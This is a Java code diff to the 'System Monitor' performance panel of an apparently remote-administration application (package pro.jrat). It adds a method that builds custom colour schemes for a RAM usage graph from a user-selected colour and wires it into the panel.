@@ -22,6 +22,8 @@ import pro.jrat.settings.Colors;
 import pro.jrat.threads.ThreadSystemMonitor;
 import pro.jrat.ui.components.JColorBox;
 
+import com.redpois0n.graphs.taskmgr.ITaskmgrColors;
+import com.redpois0n.graphs.taskmgr.TaskmgrColors;
 import com.redpois0n.graphs.taskmgr.TaskmgrGraph;
 
 @SuppressWarnings("serial")
@@ -41,16 +43,16 @@ public class PanelControlPerformance extends PanelControlParent {
 		colorBox = new JColorBox(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				Color color = colorBox.getColor();
-				if (color != null && barRAM != null && ramMeter != null) {
+				if (barRAM != null && ramMeter != null) {
 					barRAM.setForeground(color);
-					// TODO ramMeter.color = color;
+					ramMeter.setColors(getColors(color));
 				}
 			}
 		});
 
 		colorBox.setProfile(Colors.getGlobal().get("system monitor"));
-
-		ramMeter = new TaskmgrGraph(false);
+				
+		ramMeter = new TaskmgrGraph(getColors(colorBox.getColor()), false);
 
 		JPanel panel = new JPanel();
 		panel.setBorder(BorderFactory.createTitledBorder("System Monitor"));
@@ -100,5 +102,34 @@ public class PanelControlPerformance extends PanelControlParent {
 		panel.setLayout(gl_panel);
 		setLayout(groupLayout);
 
+	}
+
+	public ITaskmgrColors getColors(final Color originalColor) {	
+		return originalColor == null ? new TaskmgrColors() : new ITaskmgrColors() {
+			@Override
+			public Color getBorderColor() {
+				return Color.white;
+			}
+
+			@Override
+			public Color getCurveColor() {
+				return originalColor.brighter();
+			}
+
+			@Override
+			public Color getGreenMeterColor() {
+				return originalColor.darker();
+			}
+
+			@Override
+			public Color getInnerFillColor() {
+				return Color.black;
+			}
+
+			@Override
+			public Color getNetColor() {
+				return originalColor.darker();
+			}
+		};
 	}
 }
